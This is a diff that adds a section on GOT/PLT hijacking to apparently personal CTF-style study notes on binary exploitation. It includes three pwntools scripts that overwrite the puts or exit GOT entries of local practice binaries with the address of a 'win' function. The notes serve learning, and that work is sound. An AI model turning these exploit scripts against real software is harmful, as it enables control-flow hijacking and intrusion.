@@ -103,3 +103,79 @@ Commands to use:
 - `pattern_create <numberOfCharForBuffer> <nameOfTheFileWhereThePatternWillBeStored>`: will create a pattern to use with the next command;
   - You can use `run < <nameOfTheFileWhereThePatternIsStored>`, to input the pattern inside of the program (you obviusly have to open it with gdb), and see (if you generated a buffer overflow) the information inside every register, and additional information that coul be useful paired with the next command.
 - `pattern_search`: it uses the pattern created before as an input for a program. The good part is that it will tell you what are the registries where group of chars from the pattern have been spotted (and their distance from the stack pointer)
+
+## GOT and PLT Hijacking
+In this kind of situation you have to check first with `checksec` if the executable file is writable in the GOT table. We have to check if it's not Full RERLO (in this case the GOT it's writable in some parts), otherwise the GOT it's readonly and then <u>the GOT attack in this case it's not usable</u>.
+In case the GOT is hijackable you should try to:
+- you have to find the address in the GOT of the function you want to hijack (to do that in IDA, you simply have to click two times on the function coming from a library, and then click two times on its offset, in this way you access to the GOT/PLT address);
+- after that you have to find the address of the instruction that you want to replace the first one with (simply see the hex value of the code you want to execute);
+- Then you can use something like pwntools in python, to use the information you retrieved to access what you want:
+```python
+from pwn import *
+
+#here I want to override the puts function
+putsGOT = "0804A00C"
+#with the code coming from the win routine
+winAddr = "0804854B"
+
+io = process("./auth")
+
+#NOTE: sendlineafter as the name suggests, send a line of input only when the string specified is outputted in the console.
+io.sendlineafter("?\n", putsGOT)
+io.sendlineafter("\n", winAddr)
+
+#opens in interactive mode
+io.interactive()
+```
+  
+**NOTE**: let the program execute at least one time the function that you want to override (to let the lazy linker load the information from the libraries) (that's why we use pwntools, because it allows us to run it at runtime);
+**WARNING**: be really careful of the type that's accepted by the scanf:
+- if it's `%x` then you have to insert the value of the address in HEX, because it needs a pointer;
+- if it's `%d` then you have to insert the value of the address in digits and NOT in HEX, otherwise it generates an error.
+```python
+from pwn import *
+
+#Here for example we need digits, so we convert the hex string in int and we provide an int
+exitGOT = int("804A01C", 16)
+winAddr = int("80485C6", 16)
+
+io = process("./vuln")
+
+io.sendlineafter("Input address\n", str(exitGOT))
+io.sendlineafter("value?\n", str(winAddr))
+
+print(io.recvall())
+```
+
+### BONUS on GOT/PLT
+You can use pwn tools event to retrieve the corresponding addresses that you need in this way:
+from pwn import *
+```python
+# Here there is another way to setup a pwntools process. While setting the context, we are specifying what process 
+context.binary = './vuln'
+
+import os
+
+# Here it's setting up the process using the context builded before
+io = process(context.binary.path)
+
+# Here we are creating a copy of the binaries, to use if for analyzing them.
+# In fact, through them you can analyze the got, symbols and so on.
+elf = context.binary
+
+#access got in search for the exit function
+exit_got = elf.got['exit']
+#here it access win as a symbol because a symbol it's a variable or a function, inside of the binary (not coming from external libraries).
+win_addr = elf.symbols['win']
+
+log.info("Address of 'exit' .got.plt entry: {}".format(hex(exit_got)))
+log.info("Address of 'win': {}".format(hex(win_addr)))
+
+#override got exit entry with win address
+io.sendlineafter('address\n', str(exit_got))
+io.sendlineafter('value?\n', str(win_addr))
+
+
+#print result
+print(io.recvall())
+```
